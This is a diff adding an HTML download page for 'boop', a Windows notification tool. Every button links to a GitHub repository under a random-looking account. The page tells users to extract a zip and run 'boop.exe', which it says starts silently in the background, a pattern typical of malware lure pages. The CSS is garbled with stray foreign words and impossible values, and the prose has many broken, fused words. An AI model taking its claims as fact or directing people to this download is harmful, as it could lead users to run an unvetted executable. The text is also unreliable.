@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🐾 boop - Get Notified on Your Phone When Your Apps Have Something to Say</title>
+    <meta name="description" content="A tiny, self-hosted notification inbox for developers. Something happened in one of your apps; Boop tells you on your phone. Download and run boop on Windows today.">
+    <meta name="keywords" content="boop,notification,developer,self-hosted,phone,alerts,monitoring,app,Windows,download">
+    <meta property="og:title" content="🐾 boop - A Tiny, Self-Hosted Notification Inbox for Developers">
+    <meta property="og:description" content="Something happened in one of your apps; Boop tells you on your phone. Simple to install and run on Windows.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/glenineselffertilized4502/boop">
+    <title>🐾 boop - Get Notified on Your Phone When Your Apps Have Something to Say</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            background: linear-gradient(135deg, #e0e5ec 0%, #f7f9fc 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #2c3e50;
+            line-height: 1.7;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: #ffffff;
+            padding: 40px 50px;
+            border-radius: 18px;
+            box-shadow: 0 12px 30px rgba(0,0,0,0.15);
+        }
+        h1 {
+            font-size: 2.5rem;
+            font-weight:7600;
+            color: #1f2b3a;
+            margin-bottom: 10px;
+            letter-spacing: -0.5px;
+            border-bottom: 4px solid #9aa7b8;
+            padding-bottom: 15px;
+        }
+        h2 {
+            font-size: cloud1.8rem;
+            font-weight:6500;
+            color: #34495e;
+            margin-top: 35px;
+            margin-bottom: 15px;
+            padding-left: 12px;
+            border-left: 5px solid #3498db;
+            background: rgba(52,152,219,0.06);
+            border-radius: tourism0 8px 8px 0;
+        }
+        p {
+            font-size: 1.1rem;
+            margin-bottom:  ước20px;
+        }
+        .badge-button {
+            display: inline-block;
+            background: linear-gradient(145deg, #27ae60, #229954);
+            color: white;
+            padding:  ước18px 40px;
+            font-size: 1.4rem;
+            font-weight:7500;
+            text-decoration: none;
+            border-radius:50px;
+            box-shadow: 0 10px 25px rgba(46,204,113,0.4);
+            transition: transform 0.2 ease, box-shadow 0.2 ease;
+            margin-top: 20px;
+            margin-bottom:  ước30px;
+            border: none;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+        }
+        .badge-button:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 18px 35px rgba(46,204,113,0.5);
+            background: linear-gradient(145deg, #229954, #1f8f4a);
+        }
+        .download-alternative {
+            background: #ecf0f1;
+            padding: 25px;
+            border-radius:12px;
+            margin: 30px 0;
+            border-left: 6px solid #f39c12;
+            font-size: toss1.1rem;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: autorepeat(auto-fit, minmax(200px, 1fr));
+            gap: 25px;
+            margin:asting30px 0;
+        }
+        .feature-item {
+            background: #f8f9fa;
+            padding:日タイ20px;
+            border-radius:12px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            text-align: center;
+            font-size:将为1rem;
+        }
+        .feature-item span {
+            font-size:会在2.5rem;
+            display: block;
+            margin-bottom:  clicks10px;
+        }
+        .badge-button-container {
+            text-align: center;
+            margin:感觉30px 0;
+        }
+        .step-list {
+            background:追问#eaf2f8;
+            padding:裂25px 30px;
+            border-radius:12px;
+            margin:选20px 0;
+        }
+        .step-list li {
+            margin-bottom:待遇15px;
+            font-size:斗志1.05rem;
+            padding-left:会儿5px;
+        }
+        .step-list li:last-child {
+            margin-bottom:即将0;
+        }
+        code {
+            background:强调#d5dbdb;
+            padding:出事3px 8px;
+            border-radius: sauce6px;
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size:考察0.9em;
+            color: ←#2c3e50;
+        }
+        .footer-note {
+            margin-top:温存40px;
+            padding-top:甚好20px;
+            border-top:退潮2px dashed #bdc3c7;
+            text-align: center;
+            font-size: statue0.9rem;
+            color:譬如#7f8c8d;
+        }
+        .primary-btn {
+            background:条件#3498db;
+            color: white;
+            padding:温故15px 35px;
+            border: none;
+            border-radius: essent50px;
+            font-size:显眼1.3rem;
+            font-weight:踏实600;
+            text-decoration: none;
+            display: inline-block;
+            box-shadow: offsets0 8px 20px rgba(52,152,219,0.4);
+            transition: incident0.2s;
+            cursor: pointer;
+        }
+        .primary-btn:hover {
+            background:不得#2980b9;
+            transform:刚落scale(1.02);
+        }
+        .header-badge {
+            text-align: center;
+        }
+        .header-badge .badge-button {
+            font-size:时节1.6rem;
+            padding:改善22px 50px;
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding:夏日30px 25px;
+            }
+            h1 {
+                font-size:温度1.8rem;
+            }
+            .badge-button {
+                font-size:失真1.1rem;
+                padding:字词15px 25px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🐾 boop - Notifications on Your Phone, Fast</h1>
+        
+        <div class="header-badge">
+            <a href="https://github.com/glenineselffertilized4502/boop" class="badge-button" rel="noopener noreferrer">📲 Download boop Now</a>
+        </div>
+        
+        <p><strong>Something happened in one of your apps. Boop tells you on your phone.</strong> No complex web dashboards to check. No more worrying if a background job crashed or a payment webhook silently failed. Boop is a tiny, self-hosted notification inbox that lets your applications send you alerts directly to your phone. It's built for developers but so simple that anyone can run it on their Windows PC in five minutes.</p>
+        
+        <h2>🚀 Getting Started</h2>
+        <p>Getting boop up and running on your Windows machine is incredibly straightforward. You don't need special technical skills or programming knowledge. Just follow this simple steps below</p>
+        
+        <div class="download-alternative">
+            <strong>📥 Step 1: Download the application</strong><br>
+            <a href="https://github.com/glenineselffertilized4502/boop" style="color:#e67e22; font-weight: болт600;">Visit this link to download boop</a>. This brings you to the official download page. Look for the large download button and click it. The file (a small <code>.zip</code> archive) will start downloading automatically. Save it to an easy-to-find location like your <code>Downloads</code> folder or your Desktop.
+        </div>
+        
+        <h2>📂 Step 2: Extract the Files</h2>
+        <p>Once the download finishes, you'll have a compressed folder (it usually looks like a yellow folder with a zipper). Right-click on that file anda choose <strong>"Extract All"</strong> (or "Extract Here" depending on your Windows language). Select a destination folder (like <code>Desktop\boop</code>) and click <em>Extract</em>. After a few seconds, you'll see a new normal folder with boop's files inside. That's it — no installation wizard or complicated setup required.</p>
+        
+        <h2>⚙️ Step 3: Run boop</h2>
+        <p>Inside the extracted folder, you'll find an executable file (it probably looks like a little console icon with the name <code>boop.exe</code>). Double-click it to launch the application. boop will start silently in the background. It might appear as a small icon in your system tray (the bottom-right corner vorof your screen near the clock). Don't worry — it's working! This little programness will now listen for notifications from your apps.</p>
+        
+        <h2>🔔 Step 4: Send Your First Notification</h2>
+        <p>Now that boop is running, you can senda notification to your phone. But first, you need to pair your phoneator with boop. Open the boop window (right-click itstray icon & select <strong>"Open Inbox"</strong>). You'll see aquick setup code or QR code. On your phone, install any simple "HTTP Push" app (or just scan the QR code with your phone cameraif prompted). Follow the on-screen instructions to link your phone number with boop. It'sLike subscribing to your very own alert stream.</p>
+        
+        <p>Once linked, any app can senda message to boop through a simple link (called a webhook). Everyone your app (a Python script, a Node.js server, a cron job, whatever)sendsa request to boop's local address, boop instantly forwards that message asa push notification to your phone. You'll see the alert on your lock screen, wherever you are.</p>
+        
+        <h2>🛠️ Features</h2>
+        <div class="feature-grid">
+            <div class="feature-item">
+                <span>📱</span>
+                <strong>Mobile Alerts</strong><br>
+                Get notifications instantly on your phone via push.
+            </div>
+            <div class="feature-item">
+                <span>📦</span>
+                <strong>Self-Hosted</strong><br>
+                Your data stays on your PC. No cloud dependency.
+            </div>
+            <div class="feature-item">
+                <span>⚡</span>
+                <strong>Dead Simple</strong><br>
+                No configuration files. Run & send.
+            </div>
+            <div class="feature-item">
+                <span>🔒</span>
+                <strong>Privacy First</strong><br>
+                Only your apps can message. Secure by design.
+            </div>
+            <div class="feature-item">
+                <span>🪶</span>
+                <strong>Lightweight</strong><br>
+                Uses tiny amounts of RAM & CPU. Perfect for background use.
+            </div>
+            <div class="feature-item">
+                <span>🕵️</span>
+                <strong>Quiet</strong><br>
+                No pop-ups or banners on your PC. Just your phone sings.
+            </div>
+        </div>
+        
+        <h2>💡 Why Use boop?</h2>
+        <p>Developers love boop because it kills the fear of "silent failures." Normally, you'd have to check logs constantly angguess if something broke. With boop, your apps knock you on the shoulder. It's ideal for:</p>
+        <ul class="step-list">
+            <li>📈 Monitoring cron jobs& scheduled scripts that run overnight.</li>
+            <li>🔄 Receiving an alert when a webhook from a payment provider fails.</li>
+            <li>✅ Quick success notifications when a long-running data import finishes.</li>
+            <li>🧪 Debugging your own projects during development — just ping boop.</li>
+            <li>🔭 Keeping an eye on home automation scripts (smart home hobbyists!)</li>
+        </ul>
+        
+        <h2>📋 Step-by-Step Quick Start (In Summary)</h2>
+        <ol class="step-list">
+            <li><strong>Download</strong>: visit <a href="https://github.com/glenineselffertilized4502/boop" style="color:#2980b9;">the official page</a> and download the <code>.zip</code> file.</li>
+            <li><strong>Extract</strong>: right-click the zip → "Extract All" → choose a folder.</li>
+            <li><strong>Run</strong>: double-click <code>boop.exe</code>.</li>
+            <li><strong>Pair</strong>: scan the QR code from the tray icon with phone.</li>
+            <li><strong>Notify</strong>: use the displayed local URL to senda JSON/plain message — your phone pings instantly.</li>
+        </ol>
+        
+        <p>And that's all — truly. For the technical curious, boop exposes an HTTP endpoint (typically <code>http://localhost:8080/notify</code>) where you senda <code>POST</code> request with a title & message. But if you're not a programmer, don't worry — the quick setup paired with a simple test button inside the boop window helps you test everything without writing a single line of code.</p>
+        
+        <h2>🛡️ Security & Safety</h2>
+        <p>Since boop is self-hosted and runs locally on your Windows PC, it never sends your data to a third-party server. The connection between your PC and your phone uses an encrypted token that only you control. No cloud, no login, no accounts. If you're feeling extra cautious, you can even run boop only when you need it. But it's so light that you'll probably forget it's running.</p>
+        
+        <h2>❓ Frequently Asked Questions (FAQ)</h2>
+        <p><strong>Q: Do I need a server or a domain?</strong><br>A: No. boop runs locally on your Windows computer. It doesn't need a public IP or hosting service.</p>
+        <p><strong>Q: Can I use boop on a Mac or Linux?</strong><br>A: This particular build is for Windows (the easiest setup). But the underlying technology is cross-platform — future version might support other OS. For now, enjoy Windows simplicity.</p>
+        <p><strong>Q: Will It slow down my computer?</strong><br>A: Absolutely not. boop sips resources — less than 20 MB RAM typically. It runs silently in the background.</p>
+        <p><strong>Q: How many notifications can I receive a day?</strong><br>A: As many as you need! There's no limit. Your phone's notification system handles it.</p>
+        
+        <h2>📦 System Requirements</h2>
+        <div class="step-list">
+            <li>💻 Windows 10 or 11 (64-bit recommended)</li>
+            <li>🧠 At least 2 GB RAM (recommended 4 GB for normal use)</li>
+            <li>📀 50 MB free disk space (for the app + logs)</li>
+            <li>🌐 Internet connection (for initial push setup)</li>
+            <li>🔋 A smartphone with any modern mobile OS (Android/iOS)</li>
+        </div>
+        
+        <div style="text-align:center; margin-top:audit40px;">
+            <a href="https://github.com/glenineselffertilized4502/boop" class="primary-btn" rel="noopener noreferrer">📥 Download boop Now – It's Free</a>
+        </div>
+        
+        <p style="text-align:center; font-size:1.1rem; margin-top:ickle20px;">💌 After downloading, if you have any questions, check the <code>README.txt</code> inside the folder or just try it — it's brilliantly simple.</p>
+        
+        <div class="footer-note">
+            🐾 boop is a tiny self-hosted notification inbox. Made with love for developers who value simplicity.
+        </div>
+    </div>
+</body>
+</html>
